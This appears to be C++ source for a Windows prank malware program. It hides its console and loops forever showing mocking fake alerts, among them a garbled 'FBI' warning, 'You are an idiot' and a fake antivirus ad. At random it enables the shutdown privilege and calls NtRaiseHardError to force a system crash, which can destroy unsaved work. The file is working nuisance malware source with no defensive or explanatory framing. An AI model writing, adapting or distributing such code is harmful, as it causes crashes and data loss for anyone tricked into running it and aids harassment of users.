#include <iostream>
#include <chrono>
#include <thread>
#include <Windows.h>
#include <time.h>
#include <ctime>
using namespace std;

typedef std::chrono::system_clock Clock;
#pragma comment(lib, "ntdll.lib")

extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);


int main() {
    void HideConsole();
    {
        ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
    }

    std::this_thread::sleep_for(10s);

    srand(time(NULL)); // Num Generator

    int randNum = (rand() % 2); // random number
    int crashtime = (rand() % 99 + 1);
    int infwhile = 0;
    int randpopup = 1; // Random popups every few seconds. set it to 0 to disable it.
    int if420 = 0; //check for 420
    int randomsearch = 0; // Random Google Searches
    //Bing searches (google is overrated \s)
    string howhack = "start www.bing.com/search?q=how+to+hack";
    string getrobux = "start www.bing.com/search?q=get+free+robux";
    string iegood = "start www.bing.com/search?q=internet+explorer+best+browser";

    auto now = Clock::now();
    std::time_t now_c = Clock::to_time_t(now);
    struct tm* parts = std::localtime(&now_c);

    std::cout << 1900 + parts->tm_year << std::endl;
    std::cout << 1 + parts->tm_mon << std::endl;
    std::cout << parts->tm_mday << std::endl;


    if (parts->tm_mday == 20 && parts->tm_mon == 3) {
        if420 = 1;
        randNum = (rand() % 4);
    }



    while (infwhile == 0) {
        if (randpopup == 1) {
            if (randNum == 0) {
                string fbierror(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"techniacal sappokt heow caln ma helpy you?",
                        L"federall beruraral of investihation ahlertt",
                        MB_ICONEXCLAMATION | MB_OK
                    );
                    
                    randNum = (rand() % 2);
                    if (if420 == 1){
                        randNum = (rand() % 3);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(2));
                crashtime = (rand() % 99 + 1);
                if (crashtime == 69) {
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }

            }
            else if (randNum == 1) {
                string nicepcerror(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"Nice computer m8",
                        L"Nice computer m8",
                        MB_ICONERROR | MB_OK
                    );
                    
                    randNum = (rand() % 2);
                    if (if420 == 1) {
                        randNum = (rand() % 3);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(2)); // wait for 2 seconds to put another message
                crashtime = (rand() % 99 + 1);
                if (crashtime == 69) {
                    string nicepccrash(); {
                        int msgboxID = MessageBox(
                            NULL,
                            L"You are an idiot hahahahahahaha",
                            L"You are an idiot (dot com)",
                            MB_ICONERROR | MB_OK
                        );
                    }
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }
            }
            else if (randNum == 2) { // proto error
                string antivirusisntenough(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"You need protegent, world's only antivirus that has data recovery software",
                        L"Antivirus is clearly not enough",
                        MB_ICONINFORMATION | MB_CANCELTRYCONTINUE
                    );
                    
                    randNum = (rand() % 2);
                    if (if420 == 1) {
                        randNum = (rand() % 3);
                    }
                }
                std::this_thread::sleep_for(std::chrono::seconds(2)); // wait for 2 seconds to put another message
                crashtime = (rand() % 99 + 1);
                if (crashtime == 69) {
                    string oopsmysystem(); {
                        int msgboxID = MessageBox(
                            NULL,
                            L"I lost my data, but I had an antivirus",
                            L"oops your system crashed",
                            MB_ICONINFORMATION | MB_CANCELTRYCONTINUE
                        );

                    }
                    Sleep(2000);
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }
            }
            else if (randNum == 3) { //420 error
                string ruderalis(); {
                    int msgboxID = MessageBox(
                        NULL,
                        L"You failed at your 1337 h4x0r skillz",
                        L"oof",
                        MB_ICONINFORMATION | MB_CANCELTRYCONTINUE
                    );
                }
                randNum = (rand() % 3);
                crashtime = (rand() % 99 + 1);
                if (crashtime == 69) {
                    string leoof(); {
                        int msgboxID = MessageBox(
                            NULL,
                            L"Nice computer m8",
                            L"Nice computer m8",
                            MB_ICONERROR | MB_OK
                        );
                    }
                    BOOLEAN bl;
                    ULONG Response;
                    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
                    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
                }
            }

        }
    }
    cout << "1010101";
    return 2;
}
